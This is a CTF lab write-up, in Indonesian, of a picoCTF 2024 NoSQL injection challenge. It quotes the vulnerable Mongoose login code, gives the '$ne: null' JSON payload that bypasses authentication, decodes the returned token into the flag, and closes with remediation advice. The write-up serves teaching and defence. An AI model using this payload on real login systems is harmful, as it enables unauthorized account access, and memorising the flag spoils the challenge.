# Writeup: No Sql Injection (Challenge ID: 443)

- **Platform:** CyLab Security Academy (picoCTF 2024)
- **Category:** Web Exploitation
- **Difficulty:** Medium
- **Event:** picoCTF 2024
- **Flag:** `academy{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_dc1a958e}`

---

## Problem Statement & Scope

Aplikasi web berbasis Node.js Express dan MongoDB (`mongodb-memory-server`) menyediakan form login pengguna. Target tantangan adalah melakukan otentikasi tanpa mengetahui kredensial asli dan mengekstraksi token rahasia pengguna yang berisi string flag.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **NoSQL Injection via Unsanitized Dynamic Parsing (CWE-943):**
   Pada berkas `server.js`, aplikasi melakukan pengecekan string JSON secara manual sebelum meletakkannya langsung ke filter kueri Mongoose:
   ```javascript
   const user = await User.findOne({
     email:
       email.startsWith("{") && email.endsWith("}")
         ? JSON.parse(email)
         : email,
     password:
       password.startsWith("{") && password.endsWith("}")
         ? JSON.parse(password)
         : password,
   });
   ```
2. **Bypass Kueri Otentikasi dengan Operator Kueri MongoDB (`$ne`):**
   Dengan mengirimkan nilai string `'{"$ne": null}'` untuk parameter `email` dan `password`, `JSON.parse` mengubah input tersebut menjadi objek operator kueri MongoDB `{ "$ne": null }`.
   Filter yang dieksekusi oleh MongoDB menjadi:
   ```javascript
   User.findOne({
     email: { $ne: null },
     password: { $ne: null }
   })
   ```
   Kondisi ini selalu bernilai benar (*truthy*) untuk entri pertama di koleksi pengguna (`initialUser`).
3. **Sensitive Information Exposure in Response:**
   Setelah menemukan entri pengguna, server langsung mengembalikan atribut sensitif `token` yang berisi representasi base64 dari flag CTF.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. Menginspeksi berkas `server.js` dari arsip `app.tar.gz`.
2. Menyusun payload HTTP POST menuju `/login` dengan Content-Type `application/json`:
   ```json
   {
     "email": "{\"$ne\": null}",
     "password": "{\"$ne\": null}"
   }
   ```
3. Mengirimkan request dan menerima respon JSON:
   ```json
   {
     "success": true,
     "email": "picoplayer355@cylabacademy.org",
     "token": "YWNhZGVteXtqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uX2RjMWE5NThlfQ==",
     "firstName": "pico",
     "lastName": "player"
   }
   ```
4. Melakukan dekode Base64 pada nilai `token`:
   `base64.b64decode("YWNhZGVteXtqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uX2RjMWE5NThlfQ==")`
   menghasilkan:
   `academy{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_dc1a958e}`

---

## Flag & Verifikasi

- **Flag:** `academy{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_dc1a958e}`
- **Hasil Submission:**
  ```json
  {"user": 1072359, "challenge": 443, "flag": "academy{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_dc1a958e}", "correct": true, "historical": false}
  ```

---

## Remediasi & Mitigasi (Perspektif Defensive LKS)

1. Jangan pernah mem-parsing string input pengguna menjadi objek kueri kustom menggunakan `JSON.parse` di kueri basis data.
2. Terapkan validasi tipe data secara ketat menggunakan skema validasi (seperti Joi, Zod, atau validator bawaan Mongoose) yang memastikan `email` dan `password` bertipe string primitif murni.
3. Gunakan pustaka sanitasi NoSQL seperti `mongo-sanitize` untuk membersihkan operator berawalan tanda dolar (`$`) dari seluruh payload request.
